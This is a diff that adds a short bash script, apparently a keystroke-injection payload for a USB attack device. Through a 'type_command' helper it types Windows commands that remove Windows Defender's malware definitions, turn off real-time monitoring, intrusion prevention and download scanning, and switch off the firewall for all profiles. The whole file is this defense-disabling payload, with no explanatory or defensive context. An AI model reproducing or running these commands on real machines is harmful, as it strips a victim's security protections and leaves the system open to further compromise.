@@ -1,0 +1,13 @@
+#!/bin/bash
+
+type_command "cmd.exe /c \"C:\Program Files\Windows Defender\MpCmdRun.exe\" -removedefinitions -all"
+type_newline
+
+type_command "Set-MpPreference -DisableIntrusionPreventionSystem \$true -DisableIOAVProtection \$true -DisableRealtimeMonitoring \$true"
+type_newline
+
+type_command "NetSh Advfirewall set allprofiles state off"
+type_newline
+
+
+
